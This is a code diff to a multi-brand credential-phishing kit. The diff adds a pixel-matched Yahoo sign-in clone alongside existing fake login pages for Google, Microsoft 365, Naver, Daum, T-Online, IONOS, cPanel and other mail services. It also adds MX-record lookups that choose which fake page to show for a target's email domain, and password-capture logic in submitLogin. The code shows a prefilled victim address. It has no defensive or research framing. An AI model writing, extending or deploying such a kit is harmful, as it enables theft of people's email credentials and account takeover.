@@ -48,33 +48,31 @@
        ========================================================= */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, 'Noto Sans KR', 'Noto Sans JP', 'Noto Sans SC', sans-serif; min-height: 100vh; background-size: cover; background-position: center; color: #333; display: flex; justify-content: center; align-items: center; padding: 20px; transition: background 0.6s ease; }
-    .login-container { background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 420px; width: 100%; padding: 48px 40px; position: relative; z-index: 1; transition: all 0.3s ease; }
-    .header { text-align: center; margin-bottom: 32px; }
-    .logo-icon { width: 64px; height: 64px; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; color: white; font-size: 28px; font-weight: 700; overflow: hidden; }
-    .logo-icon img { width: 100%; height: 100%; object-fit: contain; }
-    .logo-text { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
-    .subtitle { color: #5f6368; font-size: 14px; margin-top: 4px; }
-    .domain-badge { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 11px; font-weight: 600; margin-top: 8px; }
-    .form-group { margin-bottom: 20px; }
-    .form-group label { display: block; color: #3c4043; font-size: 14px; font-weight: 500; margin-bottom: 6px; }
-    .form-group input { width: 100%; padding: 12px 14px; border: 2px solid #dadce0; border-radius: 8px; font-size: 15px; font-family: inherit; transition: border-color 0.2s; }
-    .form-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 3px rgba(26,115,232,0.1); }
-    .form-group input:disabled { background: #f8f9fa; color: #5f6368; }
-    .form-group input.error { border-color: #d93025; }
-    .password-wrapper { position: relative; }
-    .password-wrapper input { padding-right: 44px; }
-    .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 4px; font-size: 18px; }
-    .btn-signin { width: 100%; padding: 14px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 8px; }
-    .btn-signin:disabled { background: #9aa0a6 !important; cursor: not-allowed; }
-    .footer-links { display: flex; justify-content: space-between; margin-top: 20px; font-size: 13px; }
-    .footer-links a { color: #1a73e8; text-decoration: none; }
-    .footer-text { text-align: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e8eaed; font-size: 12px; color: #9aa0a6; }
-    .brand-flag { display: inline-block; font-size: 10px; background: rgba(0,0,0,0.05); padding: 2px 8px; border-radius: 10px; color: #666; margin-left: 6px; }
-    .err-box { color: #d32f2f; font-size: 13px; margin-top: 10px; display: none; text-align: left; font-weight: 500; }
-    .err-box.show { display: block; }
+    
+    /* =========================================================
+       CLONE 1: YAHOO LAYOUT (Exact Match)
+       ========================================================= */
+    body.is-yahoo { display: flex !important; flex-direction: column; background: #f4f4f4 !important; padding: 0 !important; justify-content: flex-start; }
+    .yahoo-top-bar { width: 100%; background: #fff; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; }
+    .yahoo-logo { font-size: 32px; font-weight: 800; color: #5f01d1; letter-spacing: -1px; font-family: 'Helvetica Neue', Arial, sans-serif; }
+    .yahoo-nav { display: flex; gap: 20px; font-size: 14px; color: #232323; }
+    .yahoo-nav a { color: #232323; text-decoration: none; }
+    .yahoo-nav a:hover { text-decoration: underline; }
+    
+    .yahoo-container { flex: 1; display: flex; justify-content: flex-end; padding: 40px 20%; width: 100%; }
+    .yahoo-card { background: #fff; width: 100%; max-width: 400px; border-radius: 16px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+    .yahoo-email { font-size: 14px; color: #232323; margin-bottom: 20px; font-weight: 500; }
+    .yahoo-title { font-size: 24px; font-weight: 700; color: #232323; margin-bottom: 24px; }
+    .yahoo-label { color: #5f01d1; font-size: 14px; font-weight: 600; margin-bottom: 8px; display: block; }
+    .yahoo-input-group { position: relative; border: 1px solid #5f01d1; border-radius: 6px; margin-bottom: 10px; }
+    .yahoo-input-group input { width: 100%; padding: 14px 40px 14px 14px; border: none; outline: none; font-size: 16px; border-radius: 6px; background: transparent; }
+    .yahoo-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #5f01d1; cursor: pointer; font-size: 18px; }
+    .yahoo-forgot { color: #232323; text-decoration: underline; font-size: 14px; margin-top: 8px; display: inline-block; margin-bottom: 32px; }
+    .yahoo-btn { width: 100%; background: #5f01d1; color: #fff; border: none; border-radius: 24px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+    .yahoo-btn:hover { background: #4a00a3; }
 
     /* =========================================================
-       CLONE 1: GOOGLE / GMAIL LAYOUT (Exact Match)
+       CLONE 2: GOOGLE / GMAIL LAYOUT (Exact Match)
        ========================================================= */
     body.is-google { display: flex !important; flex-direction: column; background: #f0f4f9 !important; padding: 0 !important; justify-content: center; align-items: center; }
     .google-layout { display: flex; flex-direction: column; width: 100%; max-width: 960px; padding: 20px; }
@@ -100,7 +98,7 @@
     .google-footer-links a:hover { text-decoration: underline; }
 
     /* =========================================================
-       CLONE 2: ABV.BG LAYOUT (Framer Clone)
+       CLONE 3: ABV.BG LAYOUT (Framer Clone)
        ========================================================= */
     body.is-abv { display: block !important; background: #fff !important; padding: 0 !important; }
     .framer-k1yVm{height:1080px;background-color:#fff;width:1351px;position:relative;margin:0 auto}
@@ -134,7 +132,7 @@
     .framer-btn{background:rgb(27,158,21);border:none;color:#fff;font-size:14px;font-weight:600;width:240px;height:40px;cursor:pointer;border-radius:2px}
 
     /* =========================================================
-       CLONE 3: MICROSOFT 365 LAYOUT
+       CLONE 4: MICROSOFT 365 LAYOUT
        ========================================================= */
     .m365-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: linear-gradient(135deg, #f4e8f8 0%, #e6f0fa 50%, #fce8ef 100%); }
     body.is-m365 { display: flex !important; padding: 0 !important; }
@@ -157,7 +155,7 @@
     .m365-btn:hover { background: #005da6; }
 
     /* =========================================================
-       CLONE 4: HIWORKS / CUSTOM DOMAIN
+       CLONE 5: HIWORKS / CUSTOM DOMAIN
        ========================================================= */
     body.is-hiworks { display: block !important; padding: 0 !important; background: #ffffff; }
     .hiworks-main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; min-height: 100vh; flex-direction: column; }
@@ -181,7 +179,7 @@
     .hiworks-footer { padding: 20px; text-align: center; color: #a0a0a0; font-size: 12px; margin-top: auto; }
 
     /* =========================================================
-       CLONE 5: NAVER LAYOUT
+       CLONE 6: NAVER LAYOUT
        ========================================================= */
     .naver-layout { display: none; width: 100vw; min-height: 100vh; justify-content: center; align-items: flex-start; padding-top: 50px; background: #fff; }
     body.is-naver { display: flex !important; padding: 0 !important; background: #fff !important; }
@@ -207,7 +205,7 @@
     .naver-footer-links { display: flex; justify-content: center; gap: 10px; font-size: 13px; color: #666; margin-top: 20px; }
 
     /* =========================================================
-       CLONE 6: DAUM LAYOUT
+       CLONE 7: DAUM LAYOUT
        ========================================================= */
     .daum-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; }
     body.is-daum { display: flex !important; padding: 0 !important; }
@@ -219,7 +217,7 @@
     .daum-btn { width: 100%; background: #f9a800; color: #fff; border: none; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; }
 
     /* =========================================================
-       CLONE 7: T-ONLINE LAYOUT
+       CLONE 8: T-ONLINE LAYOUT
        ========================================================= */
     body.is-tonline { display: flex !important; align-items: center; justify-content: center; background: linear-gradient(135deg, #8c8c9e 0%, #b58b9c 100%) !important; padding: 0; }
     .tonline-box { background: #fff; width: 480px; border-radius: 8px; padding: 36px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); position: relative; }
@@ -242,7 +240,7 @@
     .tonline-back { color: #e20074; text-decoration: none; font-size: 14px; }
 
     /* =========================================================
-       CLONE 8: HI-BOX (TAIWAN) LAYOUT
+       CLONE 9: HI-BOX (TAIWAN) LAYOUT
        ========================================================= */
     body.is-hibox { display: flex !important; align-items: center; justify-content: center; background: #f0f0f0 !important; padding: 0; }
     .hibox-wrapper { width: 1000px; background: #fff; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-radius: 4px; overflow: hidden; }
@@ -270,7 +268,7 @@
     .hibox-footer { text-align: center; font-size: 12px; color: #666; padding: 20px; border-top: 1px solid #eee; margin-top: 20px; }
 
     /* =========================================================
-       CLONE 9: IONOS LAYOUT
+       CLONE 10: IONOS LAYOUT
        ========================================================= */
     body.is-ionos { display: block !important; background: #f4f6f8 !important; padding: 0 !important; }
     .ionos-header { background: #fff; padding: 15px 40px; display: flex; align-items: center; border-bottom: 1px solid #e0e0e0; }
@@ -292,7 +290,7 @@
     .ionos-footer { text-align: center; font-size: 12px; color: #888; margin-top: 30px; }
 
     /* =========================================================
-       CLONE 10: ROUNDCUBE WEBMAIL LAYOUT
+       CLONE 11: ROUNDCUBE WEBMAIL LAYOUT
        ========================================================= */
     body.is-webmail { display: flex !important; align-items: center; justify-content: center; background: #fff !important; padding: 0; }
     .rc-layout { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px; }
@@ -308,7 +306,7 @@
     .rc-footer a { color: #40b3e0; text-decoration: none; }
 
     /* =========================================================
-       CLONE 11: CPANEL WEBMAIL LAYOUT
+       CLONE 12: CPANEL WEBMAIL LAYOUT
        ========================================================= */
     body.is-cpanel { display: flex !important; align-items: center; justify-content: center; background: #f4f4f4 !important; padding: 0; }
     .cpanel-card { background: #fff; width: 100%; max-width: 440px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; }
@@ -324,7 +322,7 @@
     .cpanel-footer a { color: #1e3a8a; text-decoration: none; margin: 0 5px; }
 
     /* =========================================================
-       CLONE 12: GENERIC BRANDED UI (Fallback)
+       CLONE 13: GENERIC BRANDED UI (Fallback)
        ========================================================= */
     .login-container { background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 420px; width: 100%; padding: 48px 40px; position: relative; z-index: 1; transition: all 0.3s ease; }
     .header { text-align: center; margin-bottom: 32px; }
@@ -348,6 +346,8 @@
     .footer-links a { color: #1a73e8; text-decoration: none; }
     .footer-text { text-align: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e8eaed; font-size: 12px; color: #9aa0a6; }
     .brand-flag { display: inline-block; font-size: 10px; background: rgba(0,0,0,0.05); padding: 2px 8px; border-radius: 10px; color: #666; margin-left: 6px; }
+    .err-box { color: #d32f2f; font-size: 13px; margin-top: 10px; display: none; text-align: left; font-weight: 500; }
+    .err-box.show { display: block; }
 
     /* =========================================================
        LOADING STATE
@@ -364,7 +364,33 @@
     <!-- LOADING SPINNER -->
     <div class="loading-layout" id="loadingContainer"><div class="spinner"></div></div>
 
-    <!-- 1. GOOGLE / GMAIL SPECIFIC UI -->
+    <!-- 1. YAHOO SPECIFIC UI -->
+    <div id="yahooContainer" style="display:none; width: 100%; min-height: 100vh; flex-direction: column;">
+        <div class="yahoo-top-bar">
+            <div class="yahoo-logo">yahoo!</div>
+            <div class="yahoo-nav">
+                <a href="#">Help</a>
+                <a href="#">Terms</a>
+                <a href="#">Privacy</a>
+            </div>
+        </div>
+        <div class="yahoo-container">
+            <div class="yahoo-card">
+                <div class="yahoo-email" id="yahooEmailDisplay">smallwood.kent@yahoo.com</div>
+                <div class="yahoo-title">Enter your password</div>
+                <label class="yahoo-label">Password</label>
+                <div class="yahoo-input-group">
+                    <input type="password" id="yahooPass" autocomplete="off" autofocus>
+                    <button class="yahoo-eye" onclick="toggleYahooPass()">👁️</button>
+                </div>
+                <a href="#" class="yahoo-forgot">Forgot password</a>
+                <button class="yahoo-btn" onclick="submitLogin('yahoo')">Next</button>
+                <div id="yahoo-err" class="err-box" style="text-align:center; margin-top:15px;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. GOOGLE / GMAIL SPECIFIC UI -->
     <div class="google-layout" id="googleContainer" style="display:none;">
         <div class="google-card">
             <div class="google-left">
@@ -404,7 +430,7 @@
         </div>
     </div>
 
-    <!-- 2. HIWORKS SPECIFIC UI -->
+    <!-- 3. HIWORKS SPECIFIC UI -->
     <div id="hiworksContainer" style="display:none; width: 100%; min-height: 100vh; flex-direction: column;">
         <div class="hiworks-main">
             <div class="hiworks-card">
@@ -451,7 +477,7 @@
         <div class="hiworks-footer">© Gabia Inc.</div>
     </div>
 
-    <!-- 3. ABV.BG SPECIFIC UI -->
+    <!-- 4. ABV.BG SPECIFIC UI -->
     <div id="abvContainer" style="display:none;">
         <div class="framer-k1yVm">
           <div class="framer-l37xyv">
@@ -489,7 +515,7 @@
         </div>
     </div>
 
-    <!-- 4. MICROSOFT 365 UI -->
+    <!-- 5. MICROSOFT 365 UI -->
     <div class="m365-layout" id="m365Container">
         <div class="m365-card">
             <div class="m365-logo"><div class="m365-logo-icon"><div></div><div></div><div></div><div></div></div>Microsoft</div>
@@ -502,7 +528,7 @@
         </div>
     </div>
 
-    <!-- 5. NAVER UI -->
+    <!-- 6. NAVER UI -->
     <div class="naver-layout" id="naverContainer">
         <div class="naver-card">
             <div class="naver-header"><img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Naver_Logotype.svg" alt="NAVER"></div>
@@ -519,7 +545,7 @@
         </div>
     </div>
 
-    <!-- 6. DAUM UI -->
+    <!-- 7. DAUM UI -->
     <div class="daum-layout" id="daumContainer">
         <div class="daum-card">
             <div class="daum-logo">Daum <span>메일</span></div>
@@ -530,7 +556,7 @@
         </div>
     </div>
 
-    <!-- 7. T-ONLINE UI -->
+    <!-- 8. T-ONLINE UI -->
     <div class="tonline-box" id="tonlineContainer" style="display:none;">
         <div class="tonline-logo">
             <svg viewBox="0 0 24 24"><path d="M4 4h4v16H4zM10 4h4v16h-4zM16 4h4v16h-4z"/></svg>
@@ -559,7 +585,7 @@
         <div id="tonline-err" class="err-box"></div>
     </div>
 
-    <!-- 8. HI-BOX (TAIWAN) UI -->
+    <!-- 9. HI-BOX (TAIWAN) UI -->
     <div class="hibox-wrapper" id="hiboxContainer" style="display:none;">
         <div class="hibox-top">
             <div class="hibox-logo">hiBox <span>全能信箱</span></div>
@@ -610,7 +636,7 @@
         <div id="hibox-err" class="err-box" style="text-align:center; padding-bottom:10px;"></div>
     </div>
 
-    <!-- 9. IONOS UI -->
+    <!-- 10. IONOS UI -->
     <div id="ionosContainer" style="display:none; width: 100%; min-height: 100vh;">
         <div class="ionos-header">
             <div class="ionos-logo">IONOS <span>PRODUCT LOGIN</span></div>
@@ -642,7 +668,7 @@
         <div class="ionos-footer">© IONOS SE. All rights reserved.</div>
     </div>
 
-    <!-- 10. ROUNDCUBE WEBMAIL UI -->
+    <!-- 11. ROUNDCUBE WEBMAIL UI -->
     <div class="rc-layout" id="webmailContainer" style="display:none;">
         <div class="rc-logo-area">
             <svg class="rc-logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -673,7 +699,7 @@
         </div>
     </div>
 
-    <!-- 11. CPANEL WEBMAIL UI -->
+    <!-- 12. CPANEL WEBMAIL UI -->
     <div class="cpanel-card" id="cpanelContainer" style="display:none;">
         <div class="cpanel-header">Webmail Login</div>
         <div class="cpanel-body">
@@ -695,7 +721,7 @@
         </div>
     </div>
 
-    <!-- 12. GENERIC BRANDED UI -->
+    <!-- 13. GENERIC BRANDED UI -->
     <div class="login-container" id="genericContainer" style="display:none;">
         <div class="header">
             <div class="logo-icon" id="logoIcon">VT</div>
@@ -768,15 +794,6 @@ function applyTranslationsToWebmail() {
     if (document.getElementById('webmailCreateLink')) document.getElementById('webmailCreateLink').textContent = t.create;
 }
 
-function applyTranslationsToCpanel() {
-    const t = getTranslations();
-    if (document.getElementById('cpanelHeaderTitle')) document.getElementById('cpanelHeaderTitle').textContent = t.loginTitle;
-    if (document.getElementById('cpanelEmailLabel')) document.getElementById('cpanelEmailLabel').textContent = t.emailLabel;
-    if (document.getElementById('cpanelPassLabel')) document.getElementById('cpanelPassLabel').textContent = t.passwordLabel;
-    if (document.getElementById('cpanelPass')) document.getElementById('cpanelPass').placeholder = t.passwordPlaceholder;
-    if (document.getElementById('cpanelBtnText')) document.getElementById('cpanelBtnText').textContent = t.logIn;
-}
-
 function applyTranslationsToGeneric() {
     const t = getTranslations();
     document.getElementById('subtitleText').textContent = t.subtitle;
@@ -823,16 +840,14 @@ async function detectProviderByMX(domain) {
         if (data.Answer) {
             const mxData = data.Answer.map(a => a.data.toLowerCase()).join(',');
             
+            if (mxData.includes('yahoodns.net') || mxData.includes('yahoo.com')) return 'yahoo';
             if (mxData.includes('google.com') || mxData.includes('googlemail.com')) return 'google';
             if (mxData.includes('mail.protection.outlook.com') || mxData.includes('eo.outlook.com')) return 'm365';
             
-            // Korean Providers
             if (mxData.includes('hiworks') || mxData.includes('gabia') || mxData.includes('mailplug') || mxData.includes('hanbiro') || mxData.includes('dooray') || mxData.includes('worksmobile') || mxData.includes('kakaowork') || mxData.includes('daouoffice') || mxData.includes('bizmeka') || mxData.includes('ktbiz') || mxData.includes('kornet')) return 'hiworks';
             
-            // Taiwan Providers
             if (mxData.includes('hibox') || mxData.includes('hinet') || mxData.includes('mail2000') || mxData.includes('mailcloud') || mxData.includes('seed.net.tw') || mxData.includes('pchome.com.tw')) return 'hibox';
             
-            // European Providers
             if (mxData.includes('gmx.net') || mxData.includes('web.de') || mxData.includes('1und1.de') || mxData.includes('ionos') || mxData.includes('strato') || mxData.includes('mail.de') || mxData.includes('freenet') || mxData.includes('telekom') || mxData.includes('posteo') || mxData.includes('mailbox.org') || mxData.includes('infomaniak') || mxData.includes('hostpoint') || mxData.includes('swizzonic') || mxData.includes('bluewin') || mxData.includes('hispeed') || mxData.includes('mailfence') || mxData.includes('migadu') || mxData.includes('laposte') || mxData.includes('orange.fr') || mxData.includes('sfr.fr') || mxData.includes('free.fr') || mxData.includes('ovh') || mxData.includes('arsys') || mxData.includes('dinahosting') || mxData.includes('nominalia') || mxData.includes('acens') || mxData.includes('telefonica') || mxData.includes('movistar') || mxData.includes('aruba.it') || mxData.includes('register.it') || mxData.includes('libero.it') || mxData.includes('virgilio.it') || mxData.includes('alice.it') || mxData.includes('tin.it') || mxData.includes('fastweb.it') || mxData.includes('tim.it')) return 'ionos';
             
             if (mxData.includes('zoho.com') || mxData.includes('zoho.eu')) return 'generic';
@@ -840,12 +855,10 @@ async function detectProviderByMX(domain) {
         }
     } catch (e) {}
     
-    // Fallback based on TLD
     if (domain.endsWith('.co.kr') || domain.endsWith('.kr')) return 'hiworks';
     if (domain.endsWith('.com.tw') || domain.endsWith('.tw')) return 'hibox';
     if (domain.endsWith('.de') || domain.endsWith('.ch') || domain.endsWith('.at') || domain.endsWith('.fr') || domain.endsWith('.es') || domain.endsWith('.it')) return 'ionos';
-    if (domain.endsWith('.co.uk') || domain.endsWith('.com')) return 'webmail'; // Fix: Prevent Google from routing to M365 by default
-    return 'webmail';
+    return 'webmail'; 
 }
 
 function detectBrand(domain) {
@@ -888,6 +901,7 @@ async function submitLogin(platform) {
     clearError(platform);
     let pass = '', email = currentEmail;
     
+    if (platform === 'yahoo') pass = document.getElementById('yahooPass').value.trim();
     if (platform === 'google') pass = document.getElementById('googlePass').value.trim();
     if (platform === 'abv') pass = document.getElementById('abvPass').value.trim();
     if (platform === 'm365') pass = document.getElementById('m365Pass').value.trim();
@@ -1100,6 +1114,18 @@ function toggleGooglePass() {
     p.type = p.type === 'password' ? 'text' : 'password';
 }
 
+function toggleYahooPass() {
+    const p = document.getElementById('yahooPass');
+    p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+function togglePasswordVisibility() {
+    const p = document.getElementById('password');
+    const b = document.querySelector('.toggle-password');
+    if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; }
+    else { p.type = 'password'; b.textContent = '👁️'; }
+}
+
 /* ============================================================
    7. ROUTING / INIT
    ============================================================ */
@@ -1116,7 +1142,10 @@ document.addEventListener('DOMContentLoaded', async function() {
     document.body.classList.add('is-loading');
     
     // DIRECT ROUTING (No MX lookup needed for known providers)
-    if (currentDomain === 'gmail.com' || currentDomain === 'google.com') {
+    if (['yahoo.com', 'ymail.com', 'rocketmail.com', 'yahoo.co.uk', 'yahoo.co.jp'].includes(currentDomain)) {
+        renderYahoo();
+    }
+    else if (currentDomain === 'gmail.com' || currentDomain === 'google.com') {
         renderGoogle();
     }
     else if (currentDomain === 'abv.bg') {
@@ -1143,13 +1172,22 @@ document.addEventListener('DOMContentLoaded', async function() {
     } else {
         // Fallback to MX Lookup for Custom Domains
         const provider = await detectProviderByMX(currentDomain);
-        if (provider === 'google') renderGoogle();
+        if (provider === 'yahoo') renderYahoo();
+        else if (provider === 'google') renderGoogle();
         else if (provider === 'm365') renderM365();
         else if (provider === 'hiworks') renderHiworks();
         else if (provider === 'hibox') renderHibox();
         else if (provider === 'ionos') renderIonos();
         else if (BRAND_DB[currentDomain]) renderGeneric(); 
         else renderWebmail(); 
+    }
+
+    function renderYahoo() {
+        document.body.classList.replace('is-loading', 'is-yahoo');
+        document.getElementById('yahooContainer').style.display = 'flex';
+        document.getElementById('yahooEmailDisplay').textContent = currentEmail;
+        document.getElementById('yahooPass').focus();
+        document.getElementById('yahooPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('yahoo'); });
     }
 
     function renderGoogle() {
